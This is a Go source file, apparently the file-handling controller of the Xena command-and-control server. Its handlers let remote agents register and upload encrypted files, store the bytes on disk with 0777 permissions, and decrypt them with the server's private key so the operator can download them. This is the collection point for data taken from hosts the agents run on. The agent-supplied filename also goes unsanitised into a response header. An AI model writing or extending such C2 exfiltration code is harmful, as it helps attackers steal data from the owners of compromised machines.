package ctrl

import (
	"c2/core"
	"c2/models"
	filesRepo "c2/repos/files"
	"io"
	"net/http"
	"os"
	"path/filepath"

	xenaC2 "github.com/zarkones/xena-client"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	cry "github.com/zarkones/xena-crypto"
)

func ListFiles(c *gin.Context) {
	files, err := filesRepo.GetMultiple()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	if len(files) == 0 {
		c.Status(http.StatusNoContent)
		return
	}

	c.JSON(http.StatusOK, files)
}

func RequestFileUpload(c *gin.Context) {
	var uploadRequest xenaC2.RequestFileUploadCtx

	if err := c.ShouldBindJSON(&uploadRequest); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"err": err})
		return
	}

	file := models.File{
		ID:                uuid.NewString(),
		StorageName:       uuid.NewString(),
		Uploaded:          false,
		UploadedByAgentID: uploadRequest.UploadedByAgentID,
		OriginalName:      uploadRequest.OriginalName,
	}

	if err := filesRepo.Insert(&file); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	c.JSON(http.StatusCreated, file)
}

func UploadFile(c *gin.Context) {
	fileID := c.Param("fileID")

	file, err := filesRepo.Get(fileID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	encryptedFileContent, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	if err := os.WriteFile(filepath.Join(core.PATH_DOWNLOADS, file.StorageName), encryptedFileContent, 0777); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	filesRepo.SetUploaded(file.ID)
}

func DownloadFile(c *gin.Context) {
	fileID := c.Param("fileID")

	file, err := filesRepo.Get(fileID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	encryptedFileContent, err := os.ReadFile(filepath.Join(core.PATH_DOWNLOADS, file.StorageName))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	fileContent, err := cry.SecureUnwrap(core.PrivateKey, string(encryptedFileContent))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"err": err})
		return
	}

	c.Header("Content-Disposition", `attachment; filename="`+file.OriginalName+`"`)

	c.Writer.Write([]byte(fileContent))
}
